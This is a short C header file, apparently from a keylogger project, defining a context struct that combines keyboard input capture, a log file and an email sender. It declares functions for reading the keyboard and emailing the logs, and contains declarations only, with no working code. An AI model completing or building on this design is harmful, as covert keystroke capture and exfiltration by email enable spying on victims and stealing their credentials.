#pragma once

#include "keylogger/utils/log_file.h"
#include "keylogger/input_handler.h"
#include "keylogger/send_email.h"

typedef struct {
    InputHandler input_handler;
    Logfile log_file;
    EmailSender sender;
} KeyloggerContext;

void *read_keyboard(void *arg);
void *send_email(void *arg);
int context_init(KeyloggerContext *context);
void context_cleanup(KeyloggerContext *context);
